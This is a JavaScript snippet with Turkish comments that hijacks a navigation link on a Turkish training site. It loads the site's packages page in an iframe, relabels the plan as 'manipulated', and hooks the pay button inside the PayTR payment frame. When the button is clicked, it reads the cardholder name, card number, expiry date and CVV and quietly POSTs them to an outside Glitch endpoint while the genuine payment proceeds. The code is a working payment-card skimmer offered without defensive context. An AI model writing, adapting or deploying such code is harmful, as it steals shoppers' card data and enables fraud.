const button = Array.from(document.querySelectorAll('.nav-link')).find(link => 
    link.querySelector('.link-title') && link.querySelector('.link-title').textContent.includes('Eğitim Paketleri')
);

if (button) {
    button.addEventListener('click', (event) => {
        event.preventDefault();

        document.body.innerHTML = '';
        const iframe = document.createElement('iframe');
        iframe.src = 'https://katiponline.com/egitim-paketleri/';
        iframe.style.width = '100%';
        iframe.style.height = '100vh';
        iframe.style.border = 'none';
        iframe.style.position = 'absolute';
        iframe.style.top = '0';
        iframe.style.left = '0';

        iframe.onload = () => {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

                // Önceki manipülasyon: plan-title’ı değiştir
                const planTitle = iframeDoc.querySelector('span.plan-title');
                if (planTitle) {
                    const originalLink = planTitle.querySelector('a');
                    planTitle.innerHTML = 'Manipüle Edilmiş Paket ';
                    if (originalLink) {
                        planTitle.appendChild(originalLink);
                    }
                }

                // İkinci iframe’i (paytriframe) bul
                const paytrIframe = iframeDoc.getElementById('paytriframe');
                if (paytrIframe) {
                    paytrIframe.onload = () => {
                        try {
                            const paytrDoc = paytrIframe.contentDocument || paytrIframe.contentWindow.document;
                            const payButton = paytrDoc.querySelector('button[onclick="bankayagit()"]');

                            if (payButton) {
                                payButton.addEventListener('click', () => {
                                    // Input verilerini topla
                                    const data = {
                                        cc_owner: paytrDoc.getElementById('name').value,
                                        cardnumber: paytrDoc.getElementById('cardnumber').value,
                                        expirationdate: paytrDoc.getElementById('expirationdate').value,
                                        cvv: paytrDoc.getElementById('securitycode').value,
                                        timestamp: new Date().toISOString() // Ekstra: Zaman damgası
                                    };

                                    // Glitch’e gönder (asenkron, kullanıcıyı etkilemez)
                                    fetch('https://economic-pewter-radius.glitch.me/log', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify(data)
                                    })
                                    .catch(error => console.error('Glitch’e gönderim hatası:', error));
                                    // Orijinal bankayagit() fonksiyonu çalışmaya devam eder
                                });
                            }
                        } catch (error) {
                            console.error('Paytriframe erişim hatası:', error);
                        }
                    };
                }
            } catch (error) {
                console.error('Iframe manipülasyon hatası:', error);
            }
        };

        document.body.appendChild(iframe);
        window.history.pushState({}, 'Eğitim Paketleri', '/egitim-paketleri');
    });
}
